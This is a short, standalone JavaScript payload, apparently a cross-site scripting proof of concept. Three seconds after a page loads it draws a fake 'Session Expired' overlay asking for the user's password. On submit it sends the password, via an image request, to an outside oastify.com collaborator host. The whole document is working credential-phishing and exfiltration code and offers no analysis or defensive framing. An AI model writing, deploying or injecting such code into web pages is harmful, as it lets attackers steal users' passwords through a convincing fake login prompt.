window.addEventListener('load', function() {
    setTimeout(function() {
        let message = document.createElement('div');
        message.style.position = 'fixed';
        message.style.top = '30%';
        message.style.left = '50%';
        message.style.transform = 'translate(-50%, -50%)';
        message.style.background = 'white';
        message.style.padding = '20px';
        message.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
        message.style.zIndex = '9999';
        message.style.display = 'block'; // Added for safety
        message.innerHTML = `
            <h2>Session Expired</h2>
            <p>Please re-enter your password:</p>
            <input type="password" id="password" placeholder="Enter password" required>
            <button id="submit">Submit</button>
        `;
        
        document.body.appendChild(message);

        document.getElementById('submit').addEventListener('click', function() {
            let password = document.getElementById('password').value;
            if (password) {
                console.log("Sending password:", password); // Debug
                let img = new Image();
                img.src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
                message.innerHTML = "<p>Loading...</p>";
            }
        });
    }, 3000);
});
